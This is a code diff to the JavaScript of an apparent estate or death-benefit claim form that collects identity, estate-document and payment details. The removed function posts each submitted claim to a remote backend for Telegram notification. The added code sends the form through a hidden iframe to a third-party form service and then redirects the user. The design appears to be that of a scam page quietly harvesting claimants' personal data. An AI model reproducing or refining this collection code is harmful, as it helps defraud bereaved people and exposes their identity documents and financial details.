@@ -1,31 +1,5 @@
 
-// Send claim data to backend for Telegram notification
-function sendTelegramNotification(payload) {
-  fetch("https://deathc.onrender.com/api/submit-claim", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(payload)
-  })
-    .then(async (res) => {
-      if (!res.ok) {
-        const msg = await res.text();
-        throw new Error("Telegram notification failed: " + msg);
-      }
-      return res.json();
-    })
-    .then((data) => {
-      console.log("Telegram notification response:", data);
-    })
-    .catch((err) => {
-      // Show error visibly on the form for diagnosis
-      const formStatus = document.getElementById("form-status");
-      if (formStatus) {
-        formStatus.textContent = "Submission failed: " + err.message;
-        formStatus.className = "form-status form-status--error";
-      }
-      console.error("Telegram notification error:", err);
-    });
-}
+// No longer sending to backend, using Formsubmit via hidden iframe
 // Tax fee calc removed
 const taxPreferenceInputs = Array.from(document.querySelectorAll('input[name="taxDeductionPreference"]'));
 const postDeliveryTaxNote = document.getElementById("post-delivery-tax-note");
@@ -99,32 +73,30 @@ form.addEventListener("reset", () => {
 });
 
 form.addEventListener("submit", (event) => {
-  event.preventDefault();
-
   if (!form.checkValidity()) {
     formStatus.textContent = "Please complete all required fields and required document confirmations.";
     formStatus.className = "form-status form-status--error";
     form.reportValidity();
+    event.preventDefault();
     return;
   }
 
+  // Save payload for review.html as before
   const data = new FormData(form);
   const payload = Object.fromEntries(data.entries());
   const paymentMethod = data.get("paymentMethod") || "Cash mailing";
   const uploadedFiles = Array.from(fileInput.files || []).map((file) => file.name);
-
-  // Capture checkboxes (FormData only includes checked ones)
   payload.paymentMethod    = paymentMethod;
   payload.uploadedFiles    = uploadedFiles;
   payload.deathCertificate = form.querySelector('[name="deathCertificate"]').checked ? "Yes" : "No";
   payload.governmentId     = form.querySelector('[name="governmentId"]').checked    ? "Yes" : "No";
   payload.estateDocs       = form.querySelector('[name="estateDocs"]').checked      ? "Yes" : "No";
   payload.attestation      = form.querySelector('[name="attestation"]').checked     ? "Yes" : "No";
-
   sessionStorage.setItem("claimPayload", JSON.stringify(payload));
 
-  // Send to Telegram
-  sendTelegramNotification(payload);
-
-  window.location.href = "review.html";
+  // Let the form submit to Formsubmit (via hidden iframe)
+  // After a short delay, redirect to review.html
+  setTimeout(() => {
+    window.location.href = "review.html";
+  }, 1200);
 });
